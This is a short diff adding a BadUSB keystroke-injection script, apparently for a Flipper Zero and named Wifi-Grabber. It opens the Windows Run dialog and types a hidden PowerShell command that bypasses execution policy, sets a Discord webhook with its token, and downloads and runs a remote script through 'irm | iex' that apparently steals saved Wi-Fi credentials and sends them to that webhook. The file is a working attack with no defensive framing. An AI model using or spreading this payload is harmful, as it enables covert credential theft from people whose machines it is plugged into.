@@ -1,0 +1,9 @@
+
+
+
+
+
+GUI r
+DELAY 500
+powershell -w h -NoP -Ep Bypass $webhook='https://discord.com/api/webhooks/1362531855483539639/xG0eARnR5Y8a-UejEUJkX9Rgzk7sKftXDOOhwN9GGc7pZRBaWCuOa-qCm_nxnNQq5Osu';irm https://raw.githubusercontent.com/Transversed/Flipper-Zero/refs/heads/main/BadUSB/Wifi-Grabber/Wifi-Grabber.ps1?token=GHSAT0AAAAAADCSRV35UXSDVBUXPA4UIFBK2AGL3BQ | iex
+ENTER
